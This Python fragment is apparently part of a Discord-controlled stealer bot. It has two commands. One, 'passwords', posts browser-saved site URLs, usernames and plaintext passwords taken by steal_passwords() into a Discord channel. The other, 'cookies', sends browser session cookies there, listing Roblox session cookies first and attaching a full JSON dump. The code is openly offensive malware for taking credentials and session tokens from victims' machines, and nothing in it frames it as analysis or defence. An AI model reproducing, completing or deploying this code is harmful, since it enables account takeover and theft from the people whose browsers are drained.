@bot.command(name="passwords", aliases=["pw"])
async def passwords(ctx):
    try:
        data = steal_passwords()
        if not data:
            return await ctx.reply("no passwords found")
        text = ""
        for b, rows in data.items():
            text += f"\n=== {b} ({len(rows)}) ===\n"
            for r in rows:
                if "pw" in r:
                    text += f"{r.get('url','')} | {r.get('user','')} : {r.get('pw','')}\n"
                else:
                    text += f"{r.get('url','')} | ENC(user)={r.get('user_enc','')[:40]}… ENC(pw)={r.get('pw_enc','')[:40]}…\n"
        for c in chunk(text or "(empty)", 1800):
            await ctx.send(f"```\n{c}\n```")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="cookies", aliases=["ck"])
async def cookies(ctx):
    try:
        data = steal_cookies()
        if not data:
            return await ctx.reply("no cookies found (browser not running?)")

        roblox = data.get("__ROBLOX__", {})
        summary_lines = []

        if roblox:
            summary_lines.append("==== 🏴‍☠️ ROBLOX COOKIES ====")
            for b, ck in roblox.items():
                summary_lines.append(f"{b}: {ck}")
            summary_lines.append("")

        # Show a compact "site -> important cookies" view for each browser
        for b, d in data.items():
            if b == "__ROBLOX__":
                continue
            if not d:
                continue
            summary_lines.append(f"=== {b} ({len(d)} cookie-blobs) ===")
            # show roblox-related first, then a few others
            roblox_sites = [s for s in d if "roblox" in s.lower()]
            others       = [s for s in d if "roblox" not in s.lower()]
            for site in roblox_sites:
                summary_lines.append(f"🏴‍☠️ {site}")
                summary_lines.append(f"   {d[site][:1500]}")
            for site in others[:8]:
                summary_lines.append(f"{site}")
                summary_lines.append(f"   {d[site][:400]}")
            summary_lines.append("")

        # Full dump as a JSON attachment (so nothing is lost)
        clean = {k: v for k, v in data.items() if k != "__ROBLOX__"}
        buf = io.BytesIO(json.dumps(clean, indent=1, default=str).encode())
        await ctx.reply("🍪 cookie summary below, full dump attached:",
                        file=discord.File(buf, "cookies.json"))

        text = "\n".join(summary_lines) or "(no cookies parsed)"
        for c in chunk(text, 1800):
            await ctx.send(f"```\n{c}\n```")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


